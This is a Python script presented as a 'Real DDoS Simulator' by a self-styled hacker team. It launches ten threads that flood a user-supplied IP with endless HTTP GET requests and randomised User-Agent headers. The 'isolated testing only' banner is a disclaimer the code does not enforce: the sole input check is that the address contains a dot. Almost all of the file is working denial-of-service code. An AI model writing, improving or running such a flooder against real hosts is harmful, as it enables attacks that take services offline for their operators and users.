import requests
import time
import random
import threading
import queue

# Colors for fun
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLACK_BG = "\033[40m"
NC = "\033[0m"

# Swag Logo
LOGO = f"""
{BLACK_BG}{RED}
  ▄████████    ▄████████  ▄█    █▄     ███      ▄█    █▄   ▄█  ▀█████████▄   ▄█    █▄
  ███    ███   ███    ███ ███    ███ ░███     ███    ███ ███    ███    ███  ███    ███
  ███    ███   ███    ███ ███    ███ ░███    ███    ███ ███▌    ███    ███  ███    ███
  ███    ███  ▄███▄▄▄███▀ ███    ███ ░███   ▄███▄▄▄▄███▀ ███▌    ███    ███  ███    ███
  ▀███████████ ▀▀███▀▀▀██▄  ███    ███ ░███  ▀▀███▀▀▀▀███▄ ███▌    ███    ███  ███    ███
  ███    ███   ███    ██▄ ███    ███ ░███    ███    ███ ███    ███    ███  ███    ███
  ███    ███   ███    ███ ███    ███ ░███    ███    ███ ███    ███    ███  ███    ███
  ███    █▀    ██████████ ████████▀  █████   ████████▀  █▀   ▄█████▀   █▀   ████████▀
{BLACK_BG}{YELLOW}       Real DDoS Simulator by BlackOps404 Team - Hacker's World!{NC}
"""

# Queue for thread management
request_queue = queue.Queue()

def flood_target(target_ip, thread_id):
    """Simulates real DDoS attack with multiple threads."""
    target = f"http://{target_ip}"
    headers = {
        "User-Agent": random.choice(["Mozilla/5.0", "Chrome/91.0", "Safari/14.0"])
    }
    requests_count = 0

    print(f"{GREEN}Thread {thread_id} starting flood on {target}...{NC}")
    while True:
        try:
            response = requests.get(target, headers=headers, timeout=5)
            requests_count += 1
            request_queue.put(1)
            if requests_count % 50 == 0:
                print(f"{YELLOW}Thread {thread_id} sent {requests_count} requests...{NC}")
            time.sleep(0.05)  # Faster but controlled
        except requests.exceptions.RequestException:
            print(f"{RED}Thread {thread_id} - Fake connection failed!{NC}")
            time.sleep(0.5)

def start_flood(target_ip, num_threads=10):
    """Starts multiple threads for flood simulation."""
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=flood_target, args=(target_ip, i+1), daemon=True)
        threads.append(t)
        t.start()
    return threads

def main():
    print(LOGO)
    print(f"{YELLOW}This is a REAL SIMULATED DDoS tool for ISOLATED TESTING ONLY!{NC}")
    print(f"{YELLOW}Use on your own isolated system (e.g., VM) - No internet or external targets!{NC}")
    target_ip = input(f"{YELLOW}Enter your isolated system IP (e.g., 192.168.56.101): {NC}")

    # Basic IP validation
    if not any(c in target_ip for c in "."):
        print(f"{RED}Invalid IP format! Use something like 192.168.56.101{NC}")
        return

    print(f"{YELLOW}Press Enter to start simulation on {target_ip} (Ctrl+C to stop)...{NC}")
    input()

    # Start flood with 10 threads
    threads = start_flood(target_ip)
    print(f"{GREEN}Started {len(threads)} threads for flood simulation!{NC}")

    try:
        while True:
            time.sleep(1)
            if not request_queue.empty():
                print(f"{YELLOW}Total requests sent: {request_queue.qsize()}{NC}")
                request_queue.queue.clear()  # Reset counter periodically
    except KeyboardInterrupt:
        print(f"{YELLOW}\nStopping simulation - System saved! Blackops404 Team!{NC}")
        for t in threads:
            t.join(timeout=2)

if __name__ == "__main__":
    main()
